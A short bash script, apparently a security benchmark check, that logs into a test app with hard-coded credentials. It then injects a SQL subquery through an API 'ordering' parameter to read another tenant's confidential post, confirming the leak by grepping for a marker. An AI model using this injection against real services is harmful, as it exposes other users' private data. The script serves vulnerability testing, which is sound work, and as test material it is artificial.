#!/usr/bin/env bash
set -euo pipefail
source "$(dirname "$0")/_lib.sh"
login user1@bench.local User123!
payload="(SELECT body FROM posts WHERE slug='globex-internal')"
curl -sf -b "$JAR" --get --data-urlencode "ordering=$payload" "$TARGET/api/v1/posts" | grep -q 'GLOBEX-CONFIDENTIAL-MARKER-7f3a'
